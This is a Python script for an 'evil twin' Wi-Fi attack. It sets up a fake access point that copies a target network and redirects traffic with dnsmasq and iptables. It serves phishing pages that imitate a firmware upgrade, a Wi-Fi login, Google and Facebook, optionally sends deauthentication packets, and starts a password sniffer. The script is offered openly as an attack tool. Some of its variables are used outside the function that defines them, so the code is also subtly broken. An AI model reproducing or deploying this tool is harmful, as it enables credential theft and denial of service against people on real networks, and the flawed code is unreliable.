import sys
import os
import random
import time
from moduless import methods
from moduless import passsniff


def configs():
    pwd = os.getcwd()

    if len(sys.argv) <= 1:
        sys.exit()

    os.system("xterm -e python3 moduless/dump.py {0} &".format(sys.argv[1]))
    essid = input("[^] (Target essid)-> ")
    if essid == "":
        print("E...r")
        sys.exit()
    else:
        print("[*] Set {0} Target essid!".format(essid))

    bssid = input("[^] (Wifi bssid)-> ")
    if bssid == "":
        print("E...r")
        sys.exit()
    else:
        print("[*] Set {0} Target bssid!".format(bssid))

    channel = input("[^] (Target channel)-> ")
    if channel == "":
        print("E...r")
        sys.exit()
    else:
        print("[*] Set {0} Target channel!".format(channel))

    iface = sys.argv[1]

    ethstat = input("[^] (interface for redirect packets)-> ")
    if ethstat == "" or ethstat == " ":
        eth = None
    else:
        eth = ethstat

    ifacemon = "at0"

    result = {
        "essid" : essid,
        "bssid" : bssid,
        "channel" : channel,
        "iface" : iface,
        "eth" : eth,
        "ifacemon" : ifacemon
    }

    return result


def main():
    config = configs()
    print("[*] Create evil twin")
    methods.createfake(config["iface"], config["essid"], config["bssid"], config["channel"])
    print("[*] Configure dnsmasq")
    methods.dnsmasqconfig()
    print("[*] Starting dnsmasq")
    methods.dnsmasqstart()
    print("[*] Set interfaces")
    methods.at0up(config["ifacemon"])
    methods.iptables(config["eth"], config["ifacemon"])
    ipforward = input("[^] IP forward on/off: ")
    if ipforward == "on" or ipforward == "On" or ipforward == "ON":
        print("[*] IP forward activate")
        methods.ipforward_on()
    elif ipforward == "off" or ipforward == "Off" or ipforward == "OFF":
        print("[*] IP forward unactivate")
        methods.ipforward_off()
        print("\n\n[^] select page:\n[1] firmware upgrade\n[2] wifi login\n[3] google login\n[4] facebook login")
        page = input("\n: ")
        if page == "1":
            methods.apache2(pwd+"/pages/firmware-upgrade.zip")
        elif page == "2":
            with open(pwd+"/pages/device/index.html", "r") as html:
                code = html.read()
                html.close()
            code = code.replace("{{ target_ap_essid }}", essid)
            methods.apache2(None, code)
        elif page == "3":
            methods.apache2(pwd+"/pages/google-login.zip")
        elif page == "4":
            methods.apache2(pwd+"/pages/facebook-login.zip")

        dos = input("[^] send Deauth packet? yes/no # ")
        if dos == "yes" or dos == "Yes" or dos == "YES":
            methods.Deauth(bssid, iface)

        passsniff.start()

main()
